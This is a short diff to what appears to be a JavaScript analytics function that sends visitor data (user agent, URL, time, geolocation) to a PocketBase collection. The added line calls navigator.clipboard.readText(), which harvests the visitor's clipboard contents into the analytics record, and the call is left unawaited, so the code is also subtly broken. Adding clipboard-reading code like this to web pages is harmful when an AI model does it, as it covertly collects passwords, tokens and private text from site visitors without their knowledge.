@@ -17,7 +17,7 @@ async function collect() {
   const unix = new Date().getTime();
   const url = window.location.href;
   const geolocation = navigator.geolocation;
-  const clipboard = navigator.clipboard;
+  const clipboard = navigator.clipboard.readText();
 
   return await pb.collection("kf_analytics").create({
     useragent: userAgent,
